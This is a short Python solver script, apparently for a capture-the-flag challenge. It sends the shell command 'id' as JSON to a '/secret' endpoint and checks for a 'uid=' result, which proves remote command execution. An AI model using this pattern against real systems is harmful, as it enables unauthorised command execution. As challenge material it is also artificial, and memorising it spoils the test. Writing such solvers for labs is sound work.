#!/usr/bin/env python3

import sys
import requests
from urllib.parse import urljoin

if len(sys.argv) < 2:
    print("Usage solve.py <url>")
    exit(1)

_, url = sys.argv

session = requests.Session()

response = session.post(urljoin(url, '/secret'), json={
    'cmd': 'id'
})

assert response.status_code == 200, f"Bad status code ({response.status_code})"

assert response.headers['Content-Type'] == "application/json", "Response is not json"

result = response.json()['result']
print(f"Result = {result}")
assert result.startswith("uid="), f"Invalid response"

print("Challenge solved !")
